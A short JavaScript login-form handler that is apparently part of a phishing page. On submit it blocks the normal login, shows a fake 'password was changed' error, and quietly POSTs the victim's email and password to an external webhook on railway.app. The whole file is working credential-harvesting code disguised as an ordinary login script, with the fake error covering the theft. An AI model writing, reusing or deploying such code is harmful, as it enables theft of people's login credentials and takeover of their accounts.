document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');

    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        const errorMessage = document.getElementById('error-message');
        errorMessage.textContent = 'Your password was changed 3 months ago.';
        errorMessage.style.display = 'block';

        const webhookURL = 'https://primary-production-011af.up.railway.app/webhook/739d8ccf-4a0a-479b-91e7-6427681622ff';

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: email,
                password: password
            })
        })
        .then(response => {
            if (response.ok) {
                console.log('Webhook submission successful');
            } else {
                console.error('Webhook submission failed:', response.status, response.statusText);
            }
        })
        .catch(error => {
            console.error('Error during webhook submission:', error);
        });
    });
});